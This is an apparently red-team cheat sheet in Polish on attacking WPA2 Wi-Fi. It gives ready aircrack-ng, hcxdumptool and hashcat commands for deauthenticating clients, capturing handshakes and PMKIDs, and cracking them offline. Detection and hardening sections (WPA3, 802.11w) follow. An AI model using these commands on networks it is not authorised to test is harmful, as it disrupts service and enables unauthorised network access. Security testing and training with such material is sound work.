---
title: "Ataki Wi-Fi"
category: "red-team"
tags: ["wireless", "wifi"]
platform: "agnostic"
mitre: ["T1200"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Ataki Wi-Fi

## TL;DR
WPA2-PSK: przechwyć handshake (lub PMKID) → offline crack. WPA2-Enterprise: evil twin + przechwycenie MSCHAPv2. Tylko na własnych/autoryzowanych sieciach.

## Setup
```bash
sudo airmon-ng start wlan0        # tryb monitor -> wlan0mon
sudo airodump-ng wlan0mon         # rozpoznanie sieci/klientów
```

## WPA2-PSK handshake
```bash
# Nasłuch na kanale konkretnej sieci
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# Deauth wymuszający reconnect (handshake)
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# Crack
hashcat -m 22000 cap.hc22000 rockyou.txt
```

## PMKID (bez klientów, clientless)
```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

## Wykrywanie (Blue Team)
- WIDS/WIPS: ramki deauth flood, rogue AP / evil twin (ten sam SSID, inny BSSID).
- Nietypowe deauth z nie-AP źródeł.

## Mitygacja / Hardening
- **WPA3** (SAE — odporny na offline crack), 802.11w (Protected Management Frames — blokuje deauth).
- Silne PSK (20+ losowych) lub 802.1X z walidacją certu serwera po stronie klienta.
- WIPS, segmentacja gościnna.

## Źródła
- [Aircrack-ng](https://www.aircrack-ng.org/) · [hashcat mode 22000](https://hashcat.net/wiki/)
